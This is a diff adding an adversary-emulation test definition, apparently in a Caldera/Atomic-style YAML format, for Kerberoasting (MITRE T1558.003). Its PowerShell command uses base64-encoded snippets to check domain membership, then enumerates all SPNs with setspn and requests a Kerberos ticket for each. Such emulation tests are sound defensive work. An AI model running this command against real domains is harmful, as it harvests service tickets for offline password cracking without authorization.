@@ -1,0 +1,11 @@
+- id: c10c8148-feec-51ae-903d-6acb7dbb6e14
+  name: Soumaia ART Tests - Request All Tickets via PowerShell
+  description: "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question."
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
+  platforms:
+    windows:
+      psh:
+        command: "powershell -NoProfile -EncodedCommand aQBmACgAKABHAGUAdAAtAEMASQBNAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AQwBvAG0AcAB1AHQAZQByAFMAeQBzAHQAZQBtACkALgBQAGEAcgB0AE8AZgBEAG8AbQBhAGkAbgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAEoAbwBpAG4AaQBuAGcAIAB0AGgAaQBzACAAYwBvAG0AcAB1AHQAZQByACAAdABvACAAYQAgAGQAbwBtAGEAaQBuACAAbQB1AHMAdAAgAGIAZQAgAGQAbwBuAGUAIABtAGEAbgB1AGEAbABsAHkACgA=\n}\nAdd-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }"
